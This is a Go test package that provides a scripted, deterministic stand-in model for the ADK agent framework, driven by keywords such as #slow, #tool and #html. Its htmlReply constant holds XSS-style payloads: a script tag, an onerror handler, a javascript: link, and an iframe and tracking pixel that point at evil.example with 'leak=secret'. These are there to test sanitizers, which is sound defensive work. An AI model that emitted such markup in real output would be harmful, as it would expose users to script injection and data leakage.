// Package testagent is a scripted ADK agent for tests, Docker Compose and the
// evaluator's self-test. It runs the real ADK REST server around a model that
// answers from a script, so the wire format is genuine and the output is
// deterministic. No LLM is involved.
package testagent

import (
	"cmp"
	"context"
	"errors"
	"fmt"
	"iter"
	"slices"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"google.golang.org/adk/v2/model"
	"google.golang.org/genai"
)

// Defaults of the scripted model's timing.
const (
	DefaultWordDelay  = 10 * time.Millisecond
	DefaultSlowDelay  = 100 * time.Millisecond
	DefaultSlowChunks = 50
)

// Probe counts what the model saw, so tests can assert on the agent side (for
// example "the upstream run was canceled").
//
// Pattern: Probe Counters
type Probe struct {
	runs      atomic.Int64
	cancelled atomic.Int64
}

// Runs is the number of GenerateContent calls so far.
func (p *Probe) Runs() int64 { return p.runs.Load() }

// Cancelled is the number of runs that stopped early because the caller went
// away.
func (p *Probe) Cancelled() int64 { return p.cancelled.Load() }

// Model is a model.LLM that answers from a script chosen by keywords in the
// last user message:
//
//	#error     fail with an error
//	#slow      stream numbered chunks slowly; stops when the context is canceled
//	#tool      call the "lookup" tool, then report its result
//	#think     send a reasoning part before the answer
//	#markdown  reply with headings, a list, a table and a code block
//	#html      reply with hostile HTML and links, for sanitizer tests
//
// Anything else is echoed back.
//
// Pattern: Scripted Model
type Model struct {
	probe      *Probe
	wordDelay  time.Duration
	slowDelay  time.Duration
	slowChunks int
	fixture    *Fixture
}

// Option customizes a Model.
type Option func(*Model)

// WithWordDelay sets the pause between streamed words of ordinary replies.
func WithWordDelay(d time.Duration) Option { return func(m *Model) { m.wordDelay = d } }

// WithSlow sets the chunk delay and chunk count of the #slow script.
func WithSlow(delay time.Duration, chunks int) Option {
	return func(m *Model) { m.slowDelay, m.slowChunks = delay, chunks }
}

// WithFixture makes the model answer the problems a fixture names as it says,
// ahead of the keyword scripts. See Fixture.
func WithFixture(f *Fixture) Option { return func(m *Model) { m.fixture = f } }

// NewModel returns a scripted model.
func NewModel(opts ...Option) *Model {
	m := &Model{
		probe:      &Probe{},
		wordDelay:  DefaultWordDelay,
		slowDelay:  DefaultSlowDelay,
		slowChunks: DefaultSlowChunks,
	}
	for _, opt := range opts {
		opt(m)
	}
	return m
}

// Probe returns the model's counters.
func (m *Model) Probe() *Probe { return m.probe }

// Name implements model.LLM.
func (*Model) Name() string { return "scripted" }

type reply struct {
	thought string
	chunks  []string
	delay   time.Duration
	// firstDelay is a pause before the first chunk.
	firstDelay time.Duration
	call       *genai.FunctionCall
	err        error
}

// GenerateContent implements model.LLM. When streaming it yields one partial
// response per chunk and then the aggregated, non-partial response, which is
// what the ADK runner and the Gemini model do.
func (m *Model) GenerateContent(ctx context.Context, req *model.LLMRequest, stream bool) iter.Seq2[*model.LLMResponse, error] {
	return func(yield func(*model.LLMResponse, error) bool) {
		m.probe.runs.Add(1)
		markCancelled := sync.OnceFunc(func() { m.probe.cancelled.Add(1) })

		r := m.plan(req)
		switch {
		case r.err != nil:
			yield(nil, r.err)
			return
		case r.call != nil:
			yield(&model.LLMResponse{
				Content:      &genai.Content{Role: genai.RoleModel, Parts: []*genai.Part{{FunctionCall: r.call}}},
				TurnComplete: true,
			}, nil)
			return
		}

		text := strings.Join(r.chunks, "")
		final := &model.LLMResponse{
			Content:       &genai.Content{Role: genai.RoleModel, Parts: finalParts(r.thought, text)},
			TurnComplete:  true,
			UsageMetadata: usageFor(req, text),
		}
		if !stream {
			yield(final, nil)
			return
		}

		emit := func(part *genai.Part) bool {
			if err := ctx.Err(); err != nil {
				markCancelled()
				yield(nil, err)
				return false
			}
			if !yield(&model.LLMResponse{Content: &genai.Content{Role: genai.RoleModel, Parts: []*genai.Part{part}}, Partial: true}, nil) {
				markCancelled()
				return false
			}
			return true
		}
		if r.thought != "" && !emit(&genai.Part{Text: r.thought, Thought: true}) {
			return
		}
		for i, chunk := range r.chunks {
			if i == 0 && r.firstDelay > 0 && !pause(ctx, r.firstDelay) {
				markCancelled()
				yield(nil, ctx.Err())
				return
			}
			if i > 0 && !pause(ctx, r.delay) {
				markCancelled()
				yield(nil, ctx.Err())
				return
			}
			if !emit(&genai.Part{Text: chunk}) {
				return
			}
		}
		yield(final, nil)
	}
}

// pause waits d, or returns false as soon as ctx is done.
func pause(ctx context.Context, d time.Duration) bool {
	if d <= 0 {
		return ctx.Err() == nil
	}
	timer := time.NewTimer(d)
	defer timer.Stop()
	select {
	case <-timer.C:
		return true
	case <-ctx.Done():
		return false
	}
}

func (m *Model) plan(req *model.LLMRequest) reply {
	text := lastUserText(req)
	if m.fixture != nil {
		if r, ok := m.fixtureReply(req, text); ok {
			return r
		}
	}
	if result, ok := lastFunctionResult(req); ok {
		return reply{chunks: wordChunks("The lookup returned: " + result), delay: m.wordDelay}
	}
	switch {
	case strings.Contains(text, "#error"):
		return reply{err: errors.New("scripted failure requested with #error")}
	case strings.Contains(text, "#slow"):
		return reply{chunks: ticks(m.slowChunks), delay: m.slowDelay}
	case strings.Contains(text, "#tool"):
		return reply{call: &genai.FunctionCall{Name: lookupTool, Args: map[string]any{"query": text}}}
	case strings.Contains(text, "#think"):
		return reply{thought: "Let me think about that.", chunks: wordChunks("You said: " + text), delay: m.wordDelay}
	case strings.Contains(text, "#markdown"):
		return reply{chunks: wordChunks(markdownReply), delay: m.wordDelay}
	case strings.Contains(text, "#html"):
		return reply{chunks: wordChunks(htmlReply), delay: m.wordDelay}
	}
	return reply{chunks: wordChunks("You said: " + text), delay: m.wordDelay}
}

// fixtureReply answers a problem the fixture names. A problem with a tool is
// answered in two steps, as ADK asks the model twice: the call, then the text.
func (m *Model) fixtureReply(req *model.LLMRequest, text string) (reply, bool) {
	id, r, ok := m.fixture.match(text)
	if !ok {
		return reply{}, false
	}
	if _, answered := lastFunctionResult(req); r.Tool != "" && !answered {
		return reply{call: &genai.FunctionCall{Name: r.Tool, Args: map[string]any{"query": id}}}, true
	}
	if m.fixture.failNow(id, text, r) {
		return reply{err: errors.New(cmp.Or(r.Error, "scripted failure"))}, true
	}
	if r.Text == "" {
		return reply{err: errors.New(r.Error)}, true
	}
	delay := m.wordDelay
	if r.WordDelayMs != nil {
		delay = time.Duration(*r.WordDelayMs) * time.Millisecond
	}
	return reply{chunks: wordChunks(r.Text), delay: delay, firstDelay: time.Duration(r.FirstDelayMs) * time.Millisecond}, true
}

func finalParts(thought, text string) []*genai.Part {
	var parts []*genai.Part
	if thought != "" {
		parts = append(parts, &genai.Part{Text: thought, Thought: true})
	}
	return append(parts, &genai.Part{Text: text})
}

// wordChunks splits text after each space, so the pieces join back to text.
func wordChunks(text string) []string {
	var chunks []string
	for piece := range strings.SplitAfterSeq(text, " ") {
		if piece != "" {
			chunks = append(chunks, piece)
		}
	}
	return chunks
}

func ticks(n int) []string {
	chunks := make([]string, n)
	for i := range chunks {
		chunks[i] = "tick " + strconv.Itoa(i+1) + " "
	}
	return chunks
}

// lastUserText is the newest user message that has text, skipping the tool
// results ADK sends back as user-role content.
func lastUserText(req *model.LLMRequest) string {
	for _, c := range slices.Backward(req.Contents) {
		if c == nil || c.Role != genai.RoleUser {
			continue
		}
		for _, p := range c.Parts {
			if p.Text != "" {
				return p.Text
			}
		}
	}
	return ""
}

// lastFunctionResult returns the result of a tool call answered in the final
// content, which means the model should now produce its answer.
func lastFunctionResult(req *model.LLMRequest) (string, bool) {
	if len(req.Contents) == 0 {
		return "", false
	}
	for _, p := range req.Contents[len(req.Contents)-1].Parts {
		if p.FunctionResponse != nil {
			return fmt.Sprint(p.FunctionResponse.Response["result"]), true
		}
	}
	return "", false
}

// usageFor makes up token counts: one per word of prompt and of reply.
func usageFor(req *model.LLMRequest, reply string) *genai.GenerateContentResponseUsageMetadata {
	var prompt int
	for _, c := range req.Contents {
		if c == nil {
			continue
		}
		for _, p := range c.Parts {
			prompt += len(strings.Fields(p.Text))
		}
	}
	completion := len(strings.Fields(reply))
	return &genai.GenerateContentResponseUsageMetadata{
		PromptTokenCount:     int32(prompt),
		CandidatesTokenCount: int32(completion),
		TotalTokenCount:      int32(prompt + completion),
	}
}

const markdownReply = "# Report\n\n" +
	"Here is a **bold** claim, some `inline code`, and a [link](https://example.com).\n\n" +
	"- first item\n- second item\n\n" +
	"| Name | Value |\n|------|-------|\n| alpha | 1 |\n\n" +
	"```go\nfmt.Println(\"hello\")\n```\n"

const htmlReply = "Here is some content.\n\n" +
	"<script>alert(1)</script>\n\n" +
	"<img src=\"x\" onerror=\"alert(1)\">\n\n" +
	"[click me](javascript:alert(1))\n\n" +
	"<iframe src=\"https://evil.example/frame\"></iframe>\n\n" +
	"![tracker](https://evil.example/pixel.png?leak=secret)\n\n" +
	"<style>body{display:none}</style>\n"
